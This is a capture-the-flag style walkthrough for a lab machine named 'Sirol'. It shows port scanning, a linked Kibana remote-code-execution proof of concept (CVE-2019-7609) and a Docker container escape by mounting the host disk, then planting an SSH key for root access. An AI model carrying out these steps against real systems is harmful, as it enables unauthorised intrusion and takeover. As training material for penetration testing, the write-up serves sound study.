# Sirol

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.219.54
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 11:18 +08
Nmap scan report for 192.168.219.54
Host is up (0.17s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE  SERVICE
22/tcp    open   ssh
53/tcp    closed domain
80/tcp    open   http
3306/tcp  open   mysql
5601/tcp  open   esmagent
24007/tcp open   unknown
```

### Kibana RCE

Port 5601 had a Kibana instance running:

<figure><img src="../../../.gitbook/assets/image (1150).png" alt=""><figcaption></figcaption></figure>

Using the Dev Tools Console, we can check the version that is running:

<figure><img src="../../../.gitbook/assets/image (3984).png" alt=""><figcaption></figcaption></figure>

This version is vulnerable to an RCE exploit:

{% embed url="https://github.com/Cr4ckC4t/cve-2019-7609" %}

Using the above PoC, we can get a shell on the Docker Container:

<figure><img src="../../../.gitbook/assets/image (478).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Mount --> Docker Escape

We can use `fdisk` to check the drives that are available:

```
root@0873e8062560:/tmp# fdisk -l
Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x16939df4

Device     Boot    Start      End  Sectors Size Id Type
/dev/sda1  *        2048 37750783 37748736  18G 83 Linux
/dev/sda2       37752830 41940991  4188162   2G  5 Extended
/dev/sda5       37752832 41940991  4188160   2G 82 Linux swap / Solaris
```

`/dev/sda1` was likely to be the host machine, and we can try to use `mount` on it:

```
root@0873e8062560:/tmp# mkdir /mnt/tmp
root@0873e8062560:/tmp# mount /dev/sda1 /mnt/tmp
```

The above commands would give us `root` access over the host machine's file system:

<figure><img src="../../../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>

Using this, we can `echo` our own SSH public key into the `authorized_keys` folder for the `root` user, and then just `ssh` in:

<figure><img src="../../../.gitbook/assets/image (2381).png" alt=""><figcaption></figcaption></figure>

Rooted!
